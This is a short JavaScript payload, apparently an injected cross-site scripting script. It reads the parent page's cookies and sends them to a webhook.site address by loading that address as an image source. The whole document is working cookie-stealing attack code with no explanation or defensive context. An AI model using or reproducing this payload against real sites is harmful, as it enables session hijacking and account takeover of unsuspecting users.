(function(){
	var result = "";
	try {
		m = window.parent.document;
		ck = m.cookie;
		result += ck;
	}
	catch (e){
		result += 'exception';
		console.log("test");
	}
	c = document.createElement("img");
	document.body.appendChild(c);
	c.src = "https://webhook.site/f48379bd-6a69-4ea6-9a71-c129c5ed5724/" + result;

})()
